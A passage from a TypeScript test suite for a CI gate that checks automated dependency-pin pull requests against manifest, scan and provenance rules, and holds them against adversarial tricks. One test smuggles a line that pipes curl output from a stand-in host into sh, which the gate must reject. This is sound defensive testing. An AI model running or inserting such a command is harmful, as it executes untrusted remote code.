    expect(onlyPinsChange('targetRevision: 13.5.0', 'targetRevision: 13.7.0')).toBe(true);
    expect(onlyPinsChange('image: a/b:1', 'image: a/c:1')).toBe(false);
    expect(onlyPinsChange('image: a/b:1', 'image: a/b:1 ')).toBe(false);
    expect(onlyPinsChange('image: a/b:1', 'image: a/b:1')).toBe(false);
    expect(onlyPinsChange('tag: 1@sha256:abc', 'tag: 1@sha256:abd')).toBe(false);
  });

  it('refuses a file added, deleted, renamed, of another mode, binary, or with its last newline changed', () => {
    const one = { file: 'a.yaml', line: 1, before: 'v: 1.0.0', after: 'v: 1.0.1' };
    const ok = diffOf([one]);
    const file = ok.files[0] as Rewritten;
    expect(lineChanges(ok.raw, ok.files)).toEqual({ lines: [one] });
    expect(lineChanges(diffOf([one], 'A').raw, ok.files)).toEqual({ reason: 'a.yaml is added, not modified in place' });
    expect(lineChanges(ok.raw.replace('100644 100644', '100644 100755'), ok.files)).toEqual({
      reason: 'a.yaml changes its mode, or is not a regular file',
    });
    expect(lineChanges(diffOf([one], 'M', '120000').raw, ok.files)).toMatchObject({ reason: /not a regular file/ });
    expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\n` }])).toMatchObject({
      reason: /adds or removes a line/,
    });
    expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\0` }])).toEqual({ reason: 'a.yaml is binary' });
    expect(lineChanges(ok.raw, [{ ...file, after: `extra: 1\n${file.after}` }])).toMatchObject({
      reason: /adds or removes a line/,
    });
    expect(lineChanges(ok.raw, [])).toEqual({ reason: 'the gate did not read a.yaml at both commits' });
    expect(lineChanges(ok.raw, [{ ...file, after: file.before }])).toEqual({ reason: 'a.yaml rewrites no line' });
    expect(lineChanges('', [])).toEqual({ reason: 'it changes no file' });
  });

  // A unified diff marks a file's header with `+++` and `---`: a line whose own text begins `++ ` or `-- ` would look
  // like one there. Compared whole, it is a line added like any other.
  it('sees a line whose text looks like a patch header, added or removed beside a pin', () => {
    const one = { file: 'apps/factory/Dockerfile', line: 1, before: 'FROM node:1.0.0', after: 'FROM node:1.0.1' };
    const ok = diffOf([one]);
    const file = ok.files[0] as Rewritten;
    for (const smuggled of ['++ ; curl -s https://example.invalid/x | sh; true \\', '-- dropped', '+++ b/other'])
      expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\n${smuggled}` }])).toMatchObject({
        reason: /adds or removes a line/,
      });
    const swapped = { ...file, before: `${file.before}\n-- kept`, after: `${file.after}\n++ added` };
    expect(lineChanges(ok.raw, [swapped])).toMatchObject({ reason: /changes more than a version or a digest/ });
  });
});

describe('the manifests and the records', () => {
  it("ignores the moved image's references and the chart's own version labels, and nothing else", () => {
    const object = (version: string, image: string) =>
      `kind: Pod\nmetadata:\n  name: x\n  labels:\n    helm.sh/chart: x-${version}\nspec:\n  image: ${image}\n  env: [${image}]`;
    const base = object('1.0.0', `a:1@sha256:${hex('1')}`);
    const head = object('1.0.1', `a:2@sha256:${hex('2')}`);
    const refs = [`a:1@sha256:${hex('1')}`, `a:2@sha256:${hex('2')}`];
    expect(manifestsDiffer(base, head, refs)).toBeUndefined();
    expect(manifestsDiffer(base, `${head}\n  more: 1`, refs)).toBe(
      'the manifests change beyond the image: Pod x at spec.more',
    );
    expect(manifestsDiffer(base, head.replace('env', 'envs'), refs)).toBe(
      'the manifests change beyond the image: Pod x at spec.envs',
    );
    expect(manifestsDiffer('', '', refs)).toMatch(/empty/);
  });

  it('names each record whose hash moves, and holds on records it could not read', () => {
    expect(staleRecords({ a: '1', b: '2' }, { a: '1', b: '2' })).toBeUndefined();
    expect(staleRecords({ a: '1', b: '2' }, { a: '1', b: '3' })).toMatch(/^it stales deploy\/test\/b\.json/);
    expect(staleRecords({}, {})).toMatch(/no refusal record/);
    expect(staleRecords({ a: '1' }, { b: '1' })).toMatch(/other refusal records/);
  });

  // The real hash, as the gate computes it with main's policy-hash.ts, which leaves out the digests admission admits:
  // a Postgres digest stales no record, so it passes.
  it('passes a Postgres digest, which moves no refusal record\u2019s hash', async () => {
    const root = join(import.meta.dirname, '..');
    const dirs = ['base', 'head'].map((side) => {
      const dir = mkdtempSync(join(tmpdir(), `pin-move-${side}-`));
      cpSync(join(root, 'deploy'), join(dir, 'deploy'), { recursive: true });
      return dir;
    }) as [string, string];
    const file = join(dirs[1], POSTGRES_FILE);
    const text = readFileSync(file, 'utf-8');
    const pinned = /image: (postgres:\S+@sha256:[0-9a-f]{64})/.exec(text)?.[1] as string;
    writeFileSync(file, text.split(pinned.slice(-64)).join(hex('e')));
    const [base, head] = (await Promise.all(dirs.map(hashesOf)).finally(() => {
      for (const dir of dirs) rmSync(dir, { recursive: true, force: true });
    })) as [Record<string, string>, Record<string, string>];
    const io = { hashes: async (side: 'base' | 'head') => (side === 'base' ? base : head) };
    const reason = await reasonOf({ ...POSTGRES, io });
    expect(head['admission-refusals']).toBe(base['admission-refusals']);
    expect(reason).toBe('passed: postgres');
    // Only the admission record reads the Postgres digest.
    for (const record of Object.keys(base).filter((r) => r !== 'admission-refusals'))
      expect(head[record]).toBe(base[record]);
  }, 60_000);
});

// An adversarial read of the rule's inputs, each weakness it showed now a hold.
describe("the reader's directory, as the pin move job leaves it", () => {
  it("never throws when Trivy's cache, root's on a runner, cannot be removed: the answer stands", () => {
    // A runner's temp after Trivy ran as root in its container: a cache directory the job's own user cannot read. Made
    // here by taking every permission off it, which the job's user meets the same way.
    const work = mkdtempSync(join(tmpdir(), 'pin-move-'));
    const db = join(work, 'cache', 'db');
    mkdirSync(db, { recursive: true });
    writeFileSync(join(db, 'trivy.db'), 'x');
    chmodSync(db, 0o000);
    const errors: string[] = [];
    const error = console.error;
    console.error = (line: string) => errors.push(line);
    try {
      // Linux, as on the runner, says EACCES on the directory itself; macOS says the directory is not empty.
      expect(() => rmSync(work, { recursive: true, force: true })).toThrow(/EACCES|ENOTEMPTY|EPERM/);
      expect(removeWork(work)).toBe(false);
      expect(errors.join('\n')).toMatch(/^left .*pin-move-.*(EACCES|ENOTEMPTY|EPERM)/);
    } finally {
      console.error = error;
      chmodSync(db, 0o755);
      rmSync(work, { recursive: true, force: true });
    }
    expect(removeWork(work)).toBe(true);
  });
});

describe('a pin move holds where an attacker would aim at its inputs', () => {
  it('a pull request whose base was ever changed: a check may have run for another base', async () => {
    const github = {
      api: async () => {
        throw new Error('not asked: the retarget holds first');
      },
      paged: async <T>() => [{ event: 'base_ref_changed' }] as T[],
    };
    const pr = {
      number: 9,
      state: 'open',
      user: { id: 1 },
      head: { sha: HEAD, ref: 'factory/pin/x', repo: { full_name: 'o/r' } },
      base: { ref: 'main', repo: { full_name: 'o/r' } },
      created_at: '2026-11-12T09:00:00Z',
    };
    const run = { repo: 'o/r', read: 't', token: '', autonomy: '', print: true };
    expect(await readPinMove(run, pr, github)).toEqual({
      reason: 'its base was changed: a pin move is proved only into main from the start',
    });
    const unread = { ...github, paged: async () => Promise.reject(new Error('GET /events: 502')) };
    expect(await readPinMove(run, pr, unread)).toMatchObject({ reason: /could not read .*502/ });
  });

  it('a head another pull request has had: its checks may have run for another base', async () => {
    const pr = {
      number: 9,
      state: 'open',
      user: { id: 1 },
      head: { sha: HEAD, ref: 'factory/pin/x', repo: { full_name: 'o/r' } },
      base: { ref: 'main', repo: { full_name: 'o/r' } },
      created_at: '2026-11-12T09:00:00Z',
    };
    const github = {
      api: async () => {
        throw new Error('not asked: the shared head holds first');
      },
      paged: async <T>(path: string) =>
        (path.includes('/commits/')
          ? [pr, { ...pr, number: 10, state: 'closed', base: { ...pr.base, ref: 'gutted' } }]
          : path.includes('/pulls?state=all')
            ? [pr]
            : []) as T[],
    };
    const run = { repo: 'o/r', read: 't', token: '', autonomy: '', print: true };
    expect(await readPinMove(run, pr, github)).toEqual({
      reason: '#10 has had the same head, so its checks may have run for another base',
    });
  });

  it('is proved on what the merge makes on main as it is, never on a merge base main has left', async () => {
    const root = mkdtempSync(join(tmpdir(), 'pin-move-merge-'));
    const git = (...args: string[]) =>
      execFileSync(
        'git',
        ['-C', root, '-c', 'user.name=t', '-c', 'user.email=t@example.invalid', '-c', 'commit.gpgsign=false', ...args],
        {
          encoding: 'utf-8',
        },
      );
    const write = (file: string, body: string) => {
      mkdirSync(dirname(join(root, file)), { recursive: true });
      writeFileSync(join(root, file), body);
    };
    const from = `example/base:1.0.0@sha256:${hex('a')}`;
    const to = `example/base:1.0.1@sha256:${hex('b')}`;
    let reader: Awaited<ReturnType<typeof realPinMoveIO>> | undefined;
    try {
      git('init', '--quiet', '-b', 'main');
      write('apps/a/Dockerfile', `FROM ${from} AS base\nRUN true\n`);
      git('add', '-A');
      git('commit', '--quiet', '-m', 'the merge base');
      const mergeBase = git('rev-parse', 'HEAD').trim();
      // main moves on: a second Dockerfile on the same image, which the pin's one line leaves behind.
      write('apps/b/Dockerfile', `FROM ${from} AS base\nRUN true\n`);
      git('add', '-A');
      git('commit', '--quiet', '-m', 'main now');
      const tip = git('rev-parse', 'HEAD').trim();
      git('checkout', '--quiet', '--detach', mergeBase);
      write('apps/a/Dockerfile', `FROM ${to} AS base\nRUN true\n`);
      git('commit', '--quiet', '-am', 'the pin move, from the old merge base');
      const head = git('rev-parse', 'HEAD').trim();
      reader = await realPinMoveIO({ repo: 'o/r', remote: root, base: tip, mergeBase, head, runs: async () => [] });
      const listed = listMoves(await reader.list('base'), await reader.list('head'));
      expect(listed).toEqual({ reason: 'the list has 2 items at the head and 1 at the base: it adds or removes one' });
    } finally {
      reader?.close();
      rmSync(root, { recursive: true, force: true });
    }
  }, 60_000);

  it('a High that appears at a new path is new, though its advisory and package were there before', () => {
    const at = (path: string): Scan => ({
      read: true,
      findings: [{ id: 'CVE-8', pkg: 'lib', path, severity: 'HIGH', fixed: false }],
    });
    const was: Scan = {
      read: true,
      findings: [...at('a/lib.jar').findings, { id: 'CVE-1', pkg: 'x', severity: 'LOW', fixed: true }],
    };
    const now: Scan = { read: true, findings: [...at('a/lib.jar').findings, ...at('b/lib.jar').findings] };
    expect(scansShow([{ from: 'x', to: 'y', was, now }])).toEqual({ reason: 'a target that brings a new HIGH: y' });
  });

  it('a finding still there at another path is not a fix gone', () => {
    const at = (path: string): Scan => ({
      read: true,
      findings: [{ id: 'CVE-9', pkg: `lib ${path}`, severity: 'MEDIUM', fixed: true }],
    });
    expect(
      scansShow([{ from: 'x', to: 'y', was: at('usr/lib/a-1.0/lib.jar'), now: at('usr/lib/a-1.1/lib.jar') }]),
    ).toEqual({
      reason: 'the scans show no finding with a fix gone: the move fixes nothing',
    });
  });

  it('scans every platform we run, each apart: a High new on arm64 alone, or no arm64 image, holds', async () => {
    const asked: string[] = [];
    const io = {
      scan: async (reference: string, platform: string) => {
        asked.push(platform);
        if (reference.endsWith(hex('a'))) return FIXED;
        return platform === 'linux/arm64'
          ? { read: true, findings: [{ id: 'CVE-7', pkg: 'zlib', severity: 'CRITICAL', fixed: false }] }
          : CLEAN;
      },
    };
    expect(await reasonOf({ ...ZAP_CASE, io })).toBe(
      `a target that brings a new CRITICAL: ${zap('2.17.0', 'b')} (linux/arm64)`,
    );
    expect([...new Set(asked)].sort()).toEqual([...PLATFORMS].sort());
    const missing = {
      scan: async (_: string, platform: string) =>
        platform === 'linux/arm64' ? Promise.reject(new Error('no linux/arm64 in the index')) : FIXED,
    };
    await expect(judged({ ...ZAP_CASE, io: missing })).rejects.toThrow('no linux/arm64');
  });

  it("compares a rendered Application's chart: only the chart's own version labels are written the same", () => {
    const rendering = (chart: string) =>
      [
        'kind: Application',
        'metadata:',
        '  name: prometheus',
        '  labels:',
        `    helm.sh/chart: x-${chart === 'prometheus' ? '1.0.0' : '1.0.1'}`,
        'spec:',
        '  source:',
        `    chart: ${chart}`,
      ].join('\n');
    expect(manifestsDiffer(rendering('prometheus'), rendering('something-else'), [])).toBe(
      'the manifests change beyond the image: Application prometheus at spec.source.chart',
    );
  });

  it("a chart's prerelease, while a later release on its major passes", async () => {
    const move = (to: string): Move => ({
      what: 'chart',
      name: 'grafana',
      kind: 'chart',
      from: '13.5.0',
      to,
      pins: [
        {
          what: 'chart',
          kind: 'chart',
          item: 'grafana',
          place: { file: 'x', line: 1 },
          from: '13.5.0',
          to,
          chart: { base: GRAFANA, head: GRAFANA },
        },
      ],
    });
    const io = { chartVersions: async () => ['13.5.0', '13.7.0', '13.8.0-rc.1'] };
    expect(await chartForward(move('13.8.0-rc.1'), io)).toBe('grafana 13.8.0-rc.1 is a prerelease, not a release');
    expect(await chartForward(move('13.7.0'), io)).toBeUndefined();
  });
});

// An independent adversarial read of the platform rule (#1057): each attack it showed passing, now a hold.
describe('the platform rule holds where an adversarial read aimed at it', () => {
  const REPO = 'o/r';
  const BRANCH = 'factory/pin/x';
  const OPENED = '2026-11-12T09:00:00Z';
  const VALUES = 'deploy/base/telemetry/values/grafana.yaml';
  const OLD = `kiwigrid/k8s-sidecar:2.11.2@sha256:${hex('4')}`;
  const NEW = `kiwigrid/k8s-sidecar:2.14.3@sha256:${hex('5')}`;
  const valueItem = (digest: string, version = '13.5.0'): Item => ({
    kind: 'chart',
    name: 'grafana',
    file: 'deploy/base/telemetry/grafana.yaml',
    line: 12,
    chart: { ...GRAFANA, version },
    pins: [{ file: VALUES, line: 3, digest: `sha256:${hex(digest)}` }],
  });
  const workload = (images: string[], version = '13.5.0') =>
    [
      'kind: Deployment',
      'metadata:',
      '  name: grafana',
      '  labels:',
      `    helm.sh/chart: grafana-${version}`,
      'spec:',
      '  replicas: 1',
      '  template:',
      '    spec:',
      '      containers:',
      ...images.map((image) => `        - image: ${image}`),
    ].join('\n');
  /** Grafana's sidecar value moved in one line, every condition true but what the case gives it. */
  const sidecarIO = (more: Partial<PinMoveIO> = {}): PinMoveIO => {
    const text = (line: string) => `sidecar:\n  image:\n${line}\n`;
    return {
      diff: async () => ({
        raw: `:100644 100644 ${'1'.repeat(40)} ${'2'.repeat(40)} M\t${VALUES}`,
        files: [
          {
            path: VALUES,
            before: text(`    tag: 2.11.2@sha256:${hex('4')}`),
            after: text(`    tag: 2.14.3@sha256:${hex('5')}`),
          },
        ],
      }),
      list: async (side) => [valueItem(side === 'base' ? '4' : '5')],
      unlisted: async () => [],
      tags: async () => ['2.11.2', '2.14.3'],
      digest: async () => `sha256:${hex('5')}`,
      chartVersions: async () => ['13.5.0', '13.7.0'],
      render: async (side) => workload(['grafana/grafana:12.0.0', side === 'base' ? OLD : NEW]),
      overlay: async () => 'kind: ConfigMap\nmetadata:\n  name: x\n',
      hashes: async () => ({ 'admission-refusals': 'x', 'mark-refusals': 'y' }),
      scan: async (reference) => (reference.includes(hex('4')) || reference.endsWith('12.0.0') ? FIXED : CLEAN),
      runs: async () => [],
      patched: async () => [],
      ...more,
    };
  };
  const check = (id: number, conclusion: string | null, suite: number): Run => ({
    ...run(PLATFORM_CHECK, conclusion, { id }),
    check_suite: { id: suite },
  });
  const workflowRun = (suite: number, more: Partial<WorkflowRun> = {}): WorkflowRun => ({
    id: suite,
    path: PLATFORM_WORKFLOW,
    event: 'pull_request',
    head_sha: HEAD,
    head_branch: BRANCH,
    created_at: '2026-11-12T10:00:00Z',
    check_suite_id: suite,
    repository: { full_name: REPO },
    head_repository: { full_name: REPO },
    pull_requests: [{ number: 9, base: { ref: 'main' } }],
    ...more,
  });
  const FOR = { number: 9, ref: BRANCH, created: OPENED, open: true };
  const pr = {
    number: 9,
    state: 'open',
    user: { id: 1 },
    head: { sha: HEAD, ref: BRANCH, repo: { full_name: REPO } },
    base: { ref: 'main', repo: { full_name: REPO } },
    created_at: OPENED,
  };
  const each = { repo: REPO, read: 't', token: '', autonomy: '', print: true };
  /** readPinMove's guards, then the compare: reaching it means no guard held. */
  const guards = (events: { event: string }[], branch: unknown[]) =>
    readPinMove(each, pr, {
      api: async () => {
        throw new Error('past every guard');
      },
      paged: async <T>(path: string) =>
        (path.includes('/events')
          ? events
          : path.includes('/pulls?state=all')
            ? branch
            : path.includes('/commits/')
              ? [pr]
              : []) as T[],
    });

  it('a platform run made for a sibling from the same branch into a gutted base: the sibling holds, closed or open', async () => {
    const sibling = { ...pr, number: 10, base: { ...pr.base, ref: 'gutted' } };
    expect(await guards([], [pr, { ...sibling, state: 'closed', closed_at: '2026-11-12T10:30:00Z' }])).toEqual({
      reason: '#10 comes from the same branch, so a run at its head may have been made for it',
    });
    expect(await guards([], [pr, sibling])).toEqual({
      reason: '#10 comes from the same branch, so a run at its head may have been made for it',
    });
    // One closed before this pull request was opened made no run for its time: that is the run's own binding.
    expect(await guards([], [pr, { ...sibling, state: 'closed', closed_at: '2026-11-12T08:00:00Z' }])).toEqual({
      reason: 'the gate could not read what it proves a pin move by (past every guard)',
    });
  });

  it("a later run's success never hides an earlier run's failure at the same head", async () => {
    const runs = workflowsOf(
      [check(100, 'failure', 1), check(200, 'success', 2)],
      [workflowRun(1), workflowRun(2)],
      REPO,
      FOR,
    );
    expect(ranIt(runs, HEAD, [PLATFORM_CHECK])).toBe(
      'platform at ccccccc is failure, not a success: something must run it',
    );
    expect(await pinMove(sidecarIO({ runs: async () => runs }), HEAD)).toEqual({
      reason: 'platform at ccccccc is failure, not a success: something must run it',
    });
  });

  it('a run from another branch, or made before the pull request was opened, is not its run', () => {
    const of = (more: Partial<WorkflowRun>) =>
      workflowsOf([check(1, 'success', 1)], [workflowRun(1, more)], REPO, FOR)[0]?.workflow;
    expect(of({})).toBe(PLATFORM_WORKFLOW);
    expect(of({ head_branch: 'gutted-source' })).toBeNull();
    expect(of({ head_branch: null })).toBeNull();
    expect(of({ created_at: '2026-11-12T08:59:59Z' })).toBeNull();
  });

  it('a base GitHub changed by itself is a base that was changed, for the pin move job and for the gate', async () => {
    for (const event of ['base_ref_changed', 'automatic_base_change_succeeded'])
      expect(await guards([{ event }], [pr])).toEqual({
        reason: 'its base was changed: a pin move is proved only into main from the start',
      });
    expect(
      await readPinMove(each, (({ created_at: _, ...rest }) => rest)(pr), {
        api: async () => ({}) as never,
        paged: async <T>() => [] as T[],
      }),
    ).toEqual({
      reason: 'GitHub named no time the pull request was opened, to read its runs from',
    });
  });

  it("a chart's new image on a tag that is no version, back on its line or across a major, holds", async () => {
    const chartItem = (version: string): Item => ({
      kind: 'chart',
      name: 'grafana',
      file: 'deploy/base/telemetry/grafana.yaml',
      line: 12,
      chart: { ...GRAFANA, version },
    });
    const io = (image: string) =>
      sidecarIO({
        diff: async () => ({
          raw: `:100644 100644 ${'1'.repeat(40)} ${'2'.repeat(40)} M\tdeploy/base/telemetry/grafana.yaml`,
          files: [
            {
              path: 'deploy/base/telemetry/grafana.yaml',
              before: `${'\n'.repeat(11)}      targetRevision: 13.5.0\n`,
              after: `${'\n'.repeat(11)}      targetRevision: 13.7.0\n`,
            },
          ],
        }),
        list: async (side) => [chartItem(side === 'base' ? '13.5.0' : '13.7.0')],
        render: async (side) =>
          side === 'base' ? workload(['grafana/grafana:12.0.0', OLD]) : workload([image, OLD], '13.7.0'),
        runs: async () => [{ ...check(1, 'success', 1), workflow: PLATFORM_WORKFLOW }],
      });
    const reason = async (image: string) => {
      const result = await pinMove(io(image), HEAD);
      return 'reason' in result ? result.reason : 'passed';
    };
    expect(await reason('grafana/grafana:nightly')).toBe(
      'grafana/grafana:nightly is not pinned to a version tag: no line to hold it to',
    );
    expect(await reason('grafana/grafana:11.9.0')).toBe('a move backwards in grafana/grafana, from 12.0.0 to 11.9.0');
    expect(await reason('grafana/grafana:13.0.0')).toBe('a major in grafana/grafana, from 12.0.0 to 13.0.0');
    expect(await reason(`grafana/grafana:12.0.1@sha256:${hex('9')}`)).toMatch(/^a digest that is not the tag's/);
    // A later version on its line, by tag alone as its publisher writes it, is the chart's publisher's: it passes.
    expect(await reason('grafana/grafana:12.0.1')).toBe('passed');
    // Its line is its variant too, and a release: no candidate, no other base image.
    expect(await reason('grafana/grafana:12.0.1-rc.1')).toBe(
      'grafana/grafana moves off its line, from 12.0.0 to 12.0.1-rc.1',
    );
    const variantIO = (from: string, to: string) =>
      sidecarIO({
        ...io(to),
        render: async (side) => (side === 'base' ? workload([from, OLD]) : workload([to, OLD], '13.7.0')),
        scan: async (reference) => (reference === from ? FIXED : CLEAN),
      });
    const variant = async (from: string, to: string) => {
      const result = await pinMove(variantIO(from, to), HEAD);
      return 'reason' in result ? result.reason : 'passed';
    };
    expect(await variant('x/y:1.4.0-alpine', 'x/y:1.4.1-alpine')).toBe('passed');
    expect(await variant('x/y:1.4.0-debian', 'x/y:1.4.1-alpine')).toBe(
      'x/y moves off its line, from 1.4.0-debian to 1.4.1-alpine',
    );
    expect(await variant('x/y:1.4.0-rc.1', 'x/y:1.4.1-rc.1')).toBe('x/y 1.4.1-rc.1 is a prerelease, not a release');
    // From a digest to a tag alone is a pin let go of.
    expect(await variant(`x/y:1.2.0@sha256:${hex('a')}`, 'x/y:1.2.1')).toBe(
      `x/y:1.2.1 drops the digest x/y:1.2.0@sha256:${hex('a')} was pinned to`,
    );
  });

  it('`started` reads manifests, not text: an argument, replicas written any way, a quoted hook key', () => {
    const ref = NEW;
    const job = `kind: Job\nmetadata:\n  name: once\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${ref}\n`;
    const named = `kind: Deployment\nmetadata:\n  name: controller\nspec:\n  replicas: 1\n  template:\n    spec:\n      containers:\n        - image: other/controller:1.0.0\n          args:\n            - --job-image=${ref}\n`;
    expect(started(`${job}---\n${named}`, [ref])).toMatch(/^no workload/);
    const scaled = (replicas: string) =>
      `kind: Deployment\nmetadata:\n  name: x\nspec:\n${replicas}\n  template:\n    spec:\n      containers:\n        - image: ${ref}\n`;
    for (const replicas of [
      '  replicas: 0',
      '  replicas: 0 # off until the feature ships',
      '  replicas: 00',
      '  replicas: 0x0',
      '  "replicas": 0',
      "  replicas: '1'",
    ])
      expect(started(scaled(replicas), [ref])).toMatch(/^no workload/);
    expect(started(scaled('  replicas: 2'), [ref])).toBeUndefined();
    const hooked = (key: string) =>
      `kind: Deployment\nmetadata:\n  name: x\n  annotations:\n    ${key}: pre-install,pre-upgrade\nspec:\n  template:\n    spec:\n      containers:\n        - image: ${ref}\n`;
    for (const key of ['helm.sh/hook', '"helm.sh/hook"', "'argocd.argoproj.io/hook'"])
      expect(started(hooked(key), [ref])).toMatch(/^no workload/);
    // An init container starts with its pod, so it counts.
    expect(
      started(
        `kind: DaemonSet\nmetadata:\n  name: x\nspec:\n  template:\n    spec:\n      initContainers:\n        - image: ${ref}\n`,
        [ref],
      ),
    ).toBeUndefined();
  });

  it('a workload the platform check scales to nothing on its own cluster, read from main’s platform-check.yaml', () => {
    const github = `kind: Deployment\nmetadata:\n  name: github\n  namespace: factory\nspec:\n  replicas: 1\n  template:\n    spec:\n      containers:\n        - image: ${NEW}\n`;
    const patched = patchedByTheCheck();
    if (typeof patched === 'string') throw new Error(patched);
    expect(patched).toContainEqual({ kind: 'Deployment', name: 'github', namespace: 'factory' });
    expect(started(github, [NEW], patched)).toMatch(/^no workload/);
    expect(started(github, [NEW], [])).toBeUndefined();
    // A patch by selector, or with no name, could reach a workload the gate cannot tell: the gate holds on it.
    expect(patchedByTheCheck('- target:\n    kind: Deployment\n    labelSelector: app=foo\n  patch: x\n')).toMatch(
      /^the platform check patches a target the gate cannot match/,
    );
    expect(patchedByTheCheck('- target:\n    kind: Deployment\n  patch: x\n')).toMatch(/cannot match/);
    expect(patchedByTheCheck('')).toBe('the platform check names no patches the gate can read');
  });

  it('a patch the gate cannot read holds the move, saying so, rather than throwing', async () => {
    const io = sidecarIO({
      runs: async () => [{ ...check(1, 'success', 1), workflow: PLATFORM_WORKFLOW }],
      patched: async () => 'the platform check names no patches the gate can read',
    });
    expect(await pinMove(io, HEAD)).toEqual({ reason: 'the platform check names no patches the gate can read' });
  });

  it("a value of Argo CD's own chart, which make up installs and no merge applies, whatever file pins it", () => {
    const pin = (file: string, item: string): Move => ({
      what: 'value',
      name: `${item}'s value at ${file}:40`,
      kind: 'chart',
      from: `sha256:${hex('4')}`,
      to: `sha256:${hex('5')}`,
      pins: [
        {
          what: 'value',
          kind: 'chart',
          item,
          place: { file, line: 40 },
          from: `sha256:${hex('4')}`,
          to: `sha256:${hex('5')}`,
        },
      ],
    });
    expect(whatRunsIt(pin('deploy/argocd/values.yaml', 'argocd'))).toEqual({
      reason: "argocd's value at deploy/argocd/values.yaml:40 is installed by make up: a merge does not apply it",
    });
    expect(whatRunsIt(pin('deploy/base/telemetry/values/x.yaml', 'argocd'))).toMatchObject({
      reason: /installed by make up/,
    });
    expect(whatRunsIt(pin('deploy/argocd/other.yaml', 'other'))).toMatchObject({ reason: /installed by make up/ });
    // By its chart too, whatever its release is called.
    const renamed = pin('deploy/base/x/values.yaml', 'argo');
    const chart = {
      repo: 'https://argoproj.github.io/argo-helm',
      chart: 'argo-cd',
      version: '10.15.0',
      release: 'argo',
      values: [],
    };
    renamed.pins = renamed.pins.map((m) => ({ ...m, chart: { base: chart, head: chart } }));
    expect(whatRunsIt(renamed)).toMatchObject({ reason: /installed by make up/ });
  });
});

// Condition 6 compares the renderings object by object: what a chart's release may change (its ConfigMaps' data, its pod
// templates' checksums, its images and version labels) passes, and each way to pass something else through that holds.
describe('the manifests, object by object', () => {
  const FIXTURES = join(import.meta.dirname, 'fixtures/pin-move');
  const recorded = (item: string, version: string) => readFileSync(join(FIXTURES, `${item}-${version}.yaml`), 'utf-8');
  /** What the gate compares a recorded chart move with: its own image pairs, from its own renderings. */
  const chartMove = async (item: string, from: string, to: string) => {
    const chart: Chart = { repo: 'https://example.test', chart: item, version: from, release: item, values: [] };
    const pin = { what: 'chart' as const, kind: 'chart' as const, item, place: { file: 'x', line: 1 }, from, to };
    const move: Move = {
      what: 'chart',
      name: item,
      kind: 'chart',
      from,
      to,
      pins: [{ ...pin, chart: { base: chart, head: { ...chart, version: to } } }],
    };
    const [was, now] = [recorded(item, from), recorded(item, to)];
    const pairs = await imagePairs(move, { render: async (side) => (side === 'base' ? was : now) });
    if (typeof pairs === 'string') throw new Error(pairs);
    const refs = pairs.flatMap((p) => [p.from, p.to, p.from.split('@')[1] ?? '', p.to.split('@')[1] ?? '']);
    return manifestsDiffer(was, now, refs);
  };

  it("passes tempo's and otel-collector's releases, whose ConfigMaps and checksums change with their images", async () => {
    expect(await chartMove('tempo', '3.1.0', '3.2.1')).toBeUndefined();
    expect(await chartMove('otel-collector', '0.174.0', '0.178.3')).toBeUndefined();
  });

  it("holds prometheus's release on the nodeSelector it adds, and kyverno's on the first object it adds", async () => {
    expect(await chartMove('prometheus', '29.35.0', '29.47.2')).toBe(
      'the manifests change beyond the image: Deployment default/prometheus-kube-state-metrics at spec.template.spec.nodeSelector',
    );
    expect(manifestsDiffer(recorded('kyverno', '3.9.1'), recorded('kyverno', '3.10.0'), [])).toBe(
      'the head renders ServiceAccount default/kyverno-check-legacy-policies, which the base does not',
    );
  });

  const IMAGE = `ghcr.io/x/y:1@sha256:${hex('1')}`;
  const deployment = (o: { image?: string; annotations?: string; template?: string; pod?: string } = {}) =>
    [
      'apiVersion: apps/v1',
      'kind: Deployment',
      'metadata:',
      '  name: app',
      '  namespace: t',
      ...(o.annotations ? ['  annotations:', `    ${o.annotations}`] : []),
      'spec:',
      '  template:',
      '    metadata:',
      '      labels: { app: app }',
      '      annotations:',
      `        ${o.template ?? 'checksum/config: aaa'}`,
      '    spec:',
      '      containers:',
      `        - image: ${o.image ?? IMAGE}`,
      ...(o.pod ? [`      ${o.pod}`] : []),
    ].join('\n');
  const configMap = (data: string, name = 'app', extra = '') =>
    `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: ${name}\n  namespace: t\n${extra}data:\n  config.yaml: ${data}\n`;
  const base = `${configMap('a')}---\n${deployment()}`;
  const judge = (head: string, was = base) => manifestsDiffer(was, head, [IMAGE]);

  it("passes a ConfigMap's data beside its pod template's checksum, written in any whitespace", () => {
    expect(judge(`${configMap('b')}---\n${deployment({ template: 'checksum/config: bbb' })}`)).toBeUndefined();
    // A key added to the data, the checksum gone, a trailing tab and other quotes: none is a difference.
    const head = `${configMap('"a"\n  more: x').replace('name: app', 'name: app\t')}---\n${deployment({ template: 'x: "z"' })}`;
    expect(judge(head, `${configMap('a')}---\n${deployment({ template: 'x: z' })}`)).toBeUndefined();
    // A checksum renamed, as a chart's template may: neither is compared.
    expect(judge(`${configMap('a')}---\n${deployment({ template: 'checksum/secret: q' })}`)).toBeUndefined();
  });

  it('holds a ConfigMap added, or renamed', () => {
    expect(judge(`${base}\n---\n${configMap('a', 'other')}`)).toBe(
      'the head renders ConfigMap t/other, which the base does not',
    );
    expect(judge(`${configMap('a', 'renamed')}---\n${deployment()}`)).toBe(
      'the head renders ConfigMap t/renamed, which the base does not',
    );
    expect(judge(deployment())).toBe('the head no longer renders ConfigMap t/app');
    expect(judge(`${configMap('a').replace('namespace: t', 'namespace: u')}---\n${deployment()}`)).toBe(
      'the head renders ConfigMap u/app, which the base does not',
    );
  });

  it("holds a Secret's data, and a ConfigMap's anything but data", () => {
    const secret = (value: string) => `apiVersion: v1\nkind: Secret\nmetadata:\n  name: s\ndata:\n  k: ${value}\n`;
    expect(manifestsDiffer(secret('YQ=='), secret('Yg=='), [])).toBe(
      'the manifests change beyond the image: Secret s at data.k',
    );
    expect(judge(`${configMap('a', 'app', 'binaryData:\n  b: YQ==\n')}---\n${deployment()}`)).toBe(
      'the manifests change beyond the image: ConfigMap t/app at binaryData',
    );
    expect(judge(`${configMap('a', 'app', 'immutable: true\n')}---\n${deployment()}`)).toBe(
      'the manifests change beyond the image: ConfigMap t/app at immutable',
    );
    const labelled = configMap('a').replace('  namespace: t\n', '  namespace: t\n  labels: { a: b }\n');
    expect(judge(`${labelled}---\n${deployment()}`)).toBe(
